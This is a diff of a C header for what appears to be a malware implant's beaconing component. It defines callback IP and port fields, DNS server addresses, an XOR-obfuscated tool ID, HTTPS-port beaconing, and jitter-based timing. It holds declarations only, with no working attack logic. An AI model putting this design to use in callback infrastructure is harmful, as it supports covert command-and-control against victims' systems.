@@ -10,7 +10,7 @@
 #define TOOL_ID					0x65ae82c7
 #define TOOL_ID_XOR_KEY			3
 #define XOR_KEY					5
-#define DEFAULT_BEACON_PORT		443		// HTTPS
+#define DEFAULT_BEACON_PORT		443	// HTTPS
 
 //Flag defines
 // OS
@@ -44,48 +44,38 @@
  *
  * @var ip - Contains the ip address to beacon back to
  * @var port - Contains the port number to beacon back on
+ * @var dnsIP - IP address(es) of DNS server(s)
  * @var macAddr - Contains the host's primary MAC address
  * @var initDelay - Time to wait before initial beacon
  * @var interval - Time to wait in between beacons
+ * @var percentVariance - variance to apply to interval
  */
 
-typedef struct __attribute__((packed)) _BEACON_INFO
-{
+typedef struct __attribute__ ((packed)) _BEACON_INFO {
 	char *ip;
 	int port;
+	char *dnsIP;
 	unsigned char macAddr[MAC_ADDR_LEN];
-	int initDelay;
+	unsigned long initDelay;
 	int interval;
 	float percentVariance;
 } BEACONINFO;
 
-
-typedef struct __attribute__((packed)) beacon_field
-{
-	unsigned char mac[20];
-	unsigned long uptime;
-	unsigned long tool_id;
-} BEACONFIELD;
-
-
-typedef struct __attribute__((packed)) beacon_header
-{
+typedef struct __attribute__ ((packed)) beacon_header {
 	unsigned short version;
 	unsigned short os;
 } BEACON_HDR;
 
-typedef struct __attribute__((packed)) add_header
-{
+typedef struct __attribute__ ((packed)) add_header {
 	unsigned short type;
 	unsigned short length;
-}ADD_HDR;
+} ADD_HDR;
 
-typedef struct __attribute__((packed)) ssl_hdr
-{
+typedef struct __attribute__ ((packed)) ssl_hdr {
 	unsigned char type;
 	unsigned short version;
 	unsigned short length;
-}SSL_HDR;
+} SSL_HDR;
 
 /*!
  * @brief Beacon
@@ -115,6 +105,6 @@ void *beacon(void *param);
  *				 the function succeeded.
  */
 
-int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, int interval, float jitter );
+int beacon_start(BEACONINFO *beaconInfo);
 int calc_jitter(int baseTime, float jitterPercent);
-#endif //__BEACON_H
+#endif							//__BEACON_H
